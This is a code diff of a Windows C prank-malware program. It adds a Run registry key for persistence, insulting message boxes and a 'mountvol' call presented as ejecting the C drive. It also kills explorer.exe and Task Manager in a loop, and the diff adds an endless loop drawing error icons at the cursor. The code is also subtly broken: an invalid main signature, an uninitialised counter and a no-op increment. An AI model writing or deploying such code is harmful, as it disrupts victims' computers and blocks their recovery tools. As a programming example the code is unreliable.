@@ -1,7 +1,8 @@
 #include <windows.h>
 #pragma comment( linker, "/subsystem:/"windows/" /entry:/"mainCRTStartup/"" )
-int main(void)
+int main(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmdShow, void)
 {
+	int a;
 	HKEY hRoot = HKEY_LOCAL_MACHINE;
 	char *szSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 	char *szModule = "D:\\software\\eclipse\\eclipse.exe";
@@ -57,9 +58,19 @@ int main(void)
 	MessageBox(NULL, "傻逼，Fake You。重启？这将导致你的电脑GG。好好享受这最后的时光吧=)", "GG Computer", MB_OK);
 		system("mountvol C:");
 	MessageBox(NULL, "C盘已经弹出", "Fake You", MB_OK); 
-	while(1){
+	while(a > 9999){
 		system("taskkill /f /im explorer.exe");
 		system("taskkill /f /im taskmgr.exe");
-	} 
+		a+1;
+	}
+	MessageBox(NULL,"第二阶段！DrawError！", "GG computer", MB_OK);
+	HWND hwnd=GetDesktopWindow();
+	HDC hdc=GetWindowDC(hwnd);
+	POINT point;
+	while(1){
+		GetCursorPos(&point);
+		DrawIcon(hdc,point.x,point.y,LoadIcon(NULL,IDI_ERROR));
+		Sleep(10);
+	}
 	return 0;
 }
